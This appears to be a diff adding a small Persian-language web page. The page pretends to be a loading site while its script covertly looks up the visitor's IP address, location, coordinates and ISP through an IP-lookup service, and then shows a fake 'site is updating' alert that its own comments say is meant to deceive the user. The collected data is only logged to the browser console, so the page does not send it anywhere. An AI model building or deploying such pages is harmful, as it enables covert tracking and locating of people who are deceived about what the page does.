@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>در حال بارگذاری</title>
+</head>
+<body style="font-family: sans-serif; text-align: center; margin-top: 60px;">
+  <h2>در حال بارگذاری سایت...</h2>
+  <p>لطفاً چند لحظه صبر کنید.</p>
+
+  <script>
+    // گرفتن IP بدون اینکه طرف بفهمه
+    fetch("https://ipinfo.io/json?token=YOUR_TOKEN_HERE")
+      .then(res => res.json())
+      .then(data => {
+        const log = {
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country,
+          loc: data.loc,
+          org: data.org,
+          time: new Date().toLocaleString()
+        };
+        console.log("📥 IP Captured:", log);
+      })
+      .catch(err => console.error("خطا در دریافت IP", err));
+
+    // پیام ظاهری الکی برای فریب کاربر
+    setTimeout(() => {
+      alert("سایت در حال به‌روزرسانی است. لطفاً بعداً مراجعه کنید.");
+    }, 1500); // ۱.۵ ثانیه بعد از لود
+  </script>
+</body>
+</html>
